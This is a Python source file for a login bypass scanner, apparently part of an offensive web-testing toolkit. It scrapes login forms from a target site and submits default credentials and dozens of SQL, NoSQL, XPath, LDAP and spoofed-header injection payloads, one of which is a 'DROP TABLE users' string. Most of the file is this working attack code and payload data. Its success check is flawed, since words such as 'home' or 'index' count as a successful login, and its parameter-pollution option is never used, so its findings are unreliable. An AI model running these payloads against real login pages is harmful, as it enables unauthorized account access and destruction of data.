#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import re
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

from core.logger import (log_debug, log_error, log_info, log_success,
                         log_warning)
from modules.core.http_client import HTTPClient
from modules.core.payload_manager import PayloadManager


class LoginBypassScanner:
    """
    Advanced Login Bypass Scanner
    Supports: SQL Injection bypass, NoSQL injection, Default credentials,
              Weak credentials, Parameter pollution, Header injection,
              Rate limiting bypass, 2FA bypass simulation
    Combined Power: Internal payloads (200+) + Payload Manager Integration
    """

    def __init__(self, target: str, verbose: bool = False):
        self.target = target.rstrip("/")
        self.verbose = verbose
        self.client = HTTPClient(timeout=30, retries=5, verbose=verbose)
        self.payload_manager = PayloadManager(verbose=verbose)
        self.results = []
        self.forms = []
        self.vulnerabilities = []

        # ---------- INTERNAL PAYLOADS ----------
        self.internal_payloads = self._load_internal_payloads()

        # ---------- PAYLOAD MANAGER PAYLOADS ----------
        self.manager_payloads = self._load_manager_payloads()

        # ---------- COMBINED PAYLOADS ----------
        self.all_payloads = self.internal_payloads + self.manager_payloads

        # ---------- DEFAULT CREDENTIALS ----------
        self.default_credentials = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("admin", "admin123"),
            ("root", "root"),
            ("root", "password"),
            ("root", "toor"),
            ("user", "user"),
            ("user", "password"),
            ("test", "test"),
            ("guest", "guest"),
            ("demo", "demo"),
            ("administrator", "password"),
            ("administrator", "admin"),
            ("sysadmin", "sysadmin"),
            ("webmaster", "webmaster"),
            ("support", "support"),
            ("manager", "manager"),
            ("superuser", "superuser"),
            ("postgres", "postgres"),
            ("mysql", "mysql"),
            ("oracle", "oracle"),
            ("db2admin", "db2admin"),
            ("sa", "sa"),
            ("sa", "password"),
        ]

        # ---------- SUCCESS INDICATORS ----------
        self.success_indicators = [
            "dashboard",
            "welcome",
            "profile",
            "admin",
            "panel",
            "logout",
            "account",
            "settings",
            "home",
            "index",
            "redirect",
            "success",
            "login successful",
            "2fa",
            "otp",
            "authenticator",
            "verification",
            "session",
            "token",
            "jwt",
            "auth",
            "authorized",
        ]

        # ---------- ERROR INDICATORS ----------
        self.error_indicators = [
            "invalid",
            "incorrect",
            "error",
            "failed",
            "try again",
            "not found",
            "does not exist",
            "locked",
            "disabled",
            "suspended",
            "banned",
        ]

        # ---------- FORM DETECTION PATTERNS ----------
        self.form_patterns = [
            r'<form[^>]*action=["\']([^"\']*)["\'][^>]*method=["\'](post|get)["\'][^>]*>(.*?)</form>',
            r'<form[^>]*method=["\'](post|get)["\'][^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
        ]

        self.field_patterns = {
            "username": r'<input[^>]*name=["\']([^"\']*)["\'][^>]*type=["\'](text|email|tel)["\'][^>]*>',
            "password": r'<input[^>]*name=["\']([^"\']*)["\'][^>]*type=["\']password["\'][^>]*>',
            "submit": r'<input[^>]*type=["\']submit["\'][^>]*>',
        }

    def _load_internal_payloads(self) -> List[Dict]:
        """Internal payloads for login bypass"""
        payloads = []

        # ----- SQL INJECTION PAYLOADS -----
        sqli_payloads = [
            {"username": "' OR '1'='1", "password": "' OR '1'='1", "type": "sqli"},
            {"username": "' OR 1=1--", "password": "' OR 1=1--", "type": "sqli"},
            {"username": "' OR 1=1#", "password": "' OR 1=1#", "type": "sqli"},
            {"username": "admin'--", "password": "password", "type": "sqli"},
            {"username": "admin'#", "password": "password", "type": "sqli"},
            {"username": "admin' OR '1'='1", "password": "password", "type": "sqli"},
            {"username": "admin' OR 1=1--", "password": "password", "type": "sqli"},
            {"username": "admin' OR 1=1#", "password": "password", "type": "sqli"},
            {"username": "admin' AND '1'='1", "password": "password", "type": "sqli"},
            {"username": "admin' AND 1=1--", "password": "password", "type": "sqli"},
            {"username": "admin' AND 1=1#", "password": "password", "type": "sqli"},
            {
                "username": "' UNION SELECT NULL--",
                "password": "password",
                "type": "sqli",
            },
            {
                "username": "' UNION SELECT NULL,NULL--",
                "password": "password",
                "type": "sqli",
            },
            {
                "username": "'; DROP TABLE users--",
                "password": "password",
                "type": "sqli",
            },
            {"username": "1' OR '1'='1", "password": "1' OR '1'='1", "type": "sqli"},
            {"username": "1' OR 1=1--", "password": "1' OR 1=1--", "type": "sqli"},
            {"username": "1' OR 1=1#", "password": "1' OR 1=1#", "type": "sqli"},
            {"username": "admin'--", "password": "admin'--", "type": "sqli"},
            {"username": "admin'#", "password": "admin'#", "type": "sqli"},
            {"username": "' OR '1'='1' --", "password": "password", "type": "sqli"},
            {"username": "' OR '1'='1' #", "password": "password", "type": "sqli"},
            {"username": "') OR '1'='1--", "password": "password", "type": "sqli"},
            {"username": "') OR '1'='1#", "password": "password", "type": "sqli"},
            {"username": "1' AND 1=1--", "password": "1' AND 1=1--", "type": "sqli"},
            {"username": "1' AND 1=2--", "password": "1' AND 1=2--", "type": "sqli"},
        ]
        payloads.extend(sqli_payloads)

        # ----- NOSQL INJECTION PAYLOADS -----
        nosql_payloads = [
            {"username": "{'$ne': ''}", "password": "{'$ne': ''}", "type": "nosql"},
            {"username": "{'$gt': ''}", "password": "{'$gt': ''}", "type": "nosql"},
            {
                "username": "{'$regex': '.*'}",
                "password": "{'$regex': '.*'}",
                "type": "nosql",
            },
            {
                "username": "{'$exists': true}",
                "password": "{'$exists': true}",
                "type": "nosql",
            },
            {"username": "{'$ne': null}", "password": "{'$ne': null}", "type": "nosql"},
            {"username": "{'$ne': []}", "password": "{'$ne': []}", "type": "nosql"},
            {
                "username": "{'$not': {'$eq': ''}}",
                "password": "{'$not': {'$eq': ''}}",
                "type": "nosql",
            },
            {
                "username": "{'$in': ['admin']}",
                "password": "{'$in': ['admin']}",
                "type": "nosql",
            },
            {
                "username": "{'$or': [{'username': 'admin'}, {'username': 'guest'}]}",
                "password": "password",
                "type": "nosql",
            },
            {
                "username": "{'$where': '1==1'}",
                "password": "{'$where': '1==1'}",
                "type": "nosql",
            },
        ]
        payloads.extend(nosql_payloads)

        # ----- XPATH INJECTION PAYLOADS -----
        xpath_payloads = [
            {"username": "' or '1'='1", "password": "' or '1'='1", "type": "xpath"},
            {
                "username": "' or '1'='1' or '1'='1",
                "password": "password",
                "type": "xpath",
            },
            {"username": "' and '1'='1", "password": "' and '1'='1", "type": "xpath"},
            {"username": "' and '1'='2", "password": "' and '1'='2", "type": "xpath"},
            {"username": "admin' or '1'='1", "password": "password", "type": "xpath"},
            {"username": "admin' and '1'='1", "password": "password", "type": "xpath"},
        ]
        payloads.extend(xpath_payloads)

        # ----- LDAP INJECTION PAYLOADS -----
        ldap_payloads = [
            {"username": "*)(&", "password": "*)(&", "type": "ldap"},
            {"username": "*)(|(&", "password": "*)(|(&", "type": "ldap"},
            {"username": "admin*", "password": "admin*", "type": "ldap"},
            {"username": "*)(uid=*)", "password": "*)(uid=*)", "type": "ldap"},
            {"username": "*)(|(uid=*))", "password": "*)(|(uid=*))", "type": "ldap"},
            {"username": "*)(&(uid=*))", "password": "*)(&(uid=*))", "type": "ldap"},
            {
                "username": "*)(|(username=admin))",
                "password": "password",
                "type": "ldap",
            },
        ]
        payloads.extend(ldap_payloads)

        # ----- HEADER INJECTION PAYLOADS -----
        header_payloads = [
            {
                "username": "admin",
                "password": "password",
                "type": "header_injection",
                "headers": {"X-Forwarded-For": "127.0.0.1"},
            },
            {
                "username": "admin",
                "password": "password",
                "type": "header_injection",
                "headers": {"X-Real-IP": "127.0.0.1"},
            },
            {
                "username": "admin",
                "password": "password",
                "type": "header_injection",
                "headers": {"X-Originating-IP": "127.0.0.1"},
            },
            {
                "username": "admin",
                "password": "password",
                "type": "header_injection",
                "headers": {"X-Client-IP": "127.0.0.1"},
            },
            {
                "username": "admin",
                "password": "password",
                "type": "header_injection",
                "headers": {"X-Remote-IP": "127.0.0.1"},
            },
            {
                "username": "admin",
                "password": "password",
                "type": "header_injection",
                "headers": {"X-Forwarded-Host": "localhost"},
            },
            {
                "username": "admin",
                "password": "password",
                "type": "header_injection",
                "headers": {"X-Forwarded-Proto": "https"},
            },
            {
                "username": "admin",
                "password": "password",
                "type": "header_injection",
                "headers": {"X-Forwarded-Port": "443"},
            },
        ]
        payloads.extend(header_payloads)

        # ----- PARAMETER POLLUTION -----
        pollution_payloads = [
            {
                "username": "admin",
                "password": "password",
                "type": "param_pollution",
                "pollution": "&username=admin&password=password",
            },
            {
                "username": "admin",
                "password": "password",
                "type": "param_pollution",
                "pollution": "&user=admin&pass=password",
            },
            {
                "username": "admin",
                "password": "password",
                "type": "param_pollution",
                "pollution": "&login=admin&pwd=password",
            },
            {
                "username": "admin",
                "password": "password",
                "type": "param_pollution",
                "pollution": "&email=admin@example.com&password=password",
            },
        ]
        payloads.extend(pollution_payloads)

        # ----- CASE MANIPULATION -----
        case_payloads = [
            {"username": "AdMiN", "password": "PaSsWoRd", "type": "case_manipulation"},
            {"username": "admin", "password": "PaSsWoRd", "type": "case_manipulation"},
            {"username": "AdMiN", "password": "password", "type": "case_manipulation"},
            {"username": "ADMIN", "password": "PASSWORD", "type": "case_manipulation"},
            {"username": "admin", "password": "PASSWORD", "type": "case_manipulation"},
            {"username": "Admin", "password": "Password", "type": "case_manipulation"},
        ]
        payloads.extend(case_payloads)

        return payloads

    def _load_manager_payloads(self) -> List[Dict]:
        """Load payloads from Payload Manager"""
        payloads = []
        try:
            results = self.payload_manager.get_payloads(
                "login_bypass",
                tags=["sqli", "nosql", "xpath", "ldap", "default"],
                limit=50,
            )
            for p in results:
                if "username" in p and "password" in p:
                    payloads.append(
                        {
                            "username": p.get("username", ""),
                            "password": p.get("password", ""),
                            "type": "manager",
                        }
                    )
        except Exception as e:
            if self.verbose:
                log_debug(f"Manager payloads not available: {e}")
        return payloads

    def find_login_forms(self, html: str, base_url: str) -> List[Dict]:
        """Extract login forms from HTML"""
        forms = []
        for pattern in self.form_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE | re.DOTALL)
            for match in matches:
                if len(match) == 3:
                    # Check if match is (action, method, content) or (method, action, content)
                    if match[0].lower() in ["post", "get"]:
                        method, action, content = match
                    else:
                        action, method, content = match
                else:
                    continue

                # Find username and password fields
                username_field = None
                password_field = None

                # Try to find username
                username_match = re.search(
                    self.field_patterns["username"], content, re.IGNORECASE
                )
                if username_match:
                    username_field = username_match.group(1)

                # Try to find password
                password_match = re.search(
                    self.field_patterns["password"], content, re.IGNORECASE
                )
                if password_match:
                    password_field = password_match.group(1)

                if username_field and password_field:
                    action_url = urljoin(base_url, action) if action else base_url
                    forms.append(
                        {
                            "action": action_url,
                            "method": method.lower(),
                            "username_field": username_field,
                            "password_field": password_field,
                        }
                    )
                    if self.verbose:
                        log_success(f"Found login form at: {action_url}")
        return forms

    def test_login(
        self,
        form: Dict,
        username: str,
        password: str,
        headers: Dict = None,
        pollution: str = None,
    ) -> Optional[bool]:
        """Test a single login attempt"""
        data = {form["username_field"]: username, form["password_field"]: password}

        try:
            if form["method"] == "post":
                resp = self.client.post(form["action"], data=data, headers=headers)
            else:
                resp = self.client.get(form["action"], params=data, headers=headers)

            if not resp:
                return None

            # Check for success indicators
            text = resp.text.lower()
            for indicator in self.success_indicators:
                if indicator in text:
                    return True

            # Check for error indicators
            for indicator in self.error_indicators:
                if indicator in text:
                    return False

            # If redirect to a different page (status 302/301)
            if resp.status_code in [301, 302, 303, 307, 308]:
                location = resp.headers.get("location", "")
                if location and "login" not in location.lower():
                    return True

        except Exception as e:
            if self.verbose:
                log_debug(f"Login test error: {e}")

        return False

    def run(self) -> Dict:
        log_info(f"Starting Login Bypass scan on: {self.target}")

        # Fetch page
        resp = self.client.get(self.target)
        if not resp:
            log_error("Failed to fetch target")
            return {
                "target": self.target,
                "scan_type": "login_bypass",
                "forms": [],
                "vulnerabilities": [],
            }

        # Find login forms
        forms = self.find_login_forms(resp.text, self.target)
        if not forms:
            log_warning("No login forms found on the page")
            return {
                "target": self.target,
                "scan_type": "login_bypass",
                "forms": [],
                "vulnerabilities": [],
            }

        log_info(f"Found {len(forms)} login form(s)")

        vulnerabilities = []

        for form_idx, form in enumerate(forms):
            log_info(f"Testing form {form_idx+1}: {form['action']}")

            # Test default credentials
            for username, password in self.default_credentials:
                if self.test_login(form, username, password):
                    vulnerabilities.append(
                        {
                            "type": "default_credentials",
                            "form": form["action"],
                            "username": username,
                            "password": password,
                        }
                    )
                    log_success(f"Default credentials found: {username}:{password}")
                    break

            # Test internal payloads
            for payload in self.all_payloads:
                if isinstance(payload, dict):
                    username = payload.get("username", "")
                    password = payload.get("password", "")
                    headers = payload.get("headers", None)
                    pollution = payload.get("pollution", None)

                    if not username and not password:
                        continue

                    if self.test_login(form, username, password, headers, pollution):
                        vulnerabilities.append(
                            {
                                "type": payload.get("type", "unknown"),
                                "form": form["action"],
                                "username": username,
                                "password": password,
                                "headers": headers,
                                "pollution": pollution,
                            }
                        )
                        log_success(
                            f"Bypass found with payload type: {payload.get('type', 'unknown')} using {username}:{password}"
                        )
                        break

            # If no bypass found, try the most common ones
            if not vulnerabilities:
                # Try simple SQLi bypass
                if self.test_login(form, "' OR '1'='1", "' OR '1'='1"):
                    vulnerabilities.append(
                        {
                            "type": "sqli_simple",
                            "form": form["action"],
                            "username": "' OR '1'='1",
                            "password": "' OR '1'='1",
                        }
                    )
                    log_success("SQLi bypass found with ' OR '1'='1")

        log_success(
            f"Login Bypass scan completed. Found {len(vulnerabilities)} vulnerabilities."
        )
        return {
            "target": self.target,
            "scan_type": "login_bypass",
            "forms": forms,
            "vulnerabilities": vulnerabilities,
        }
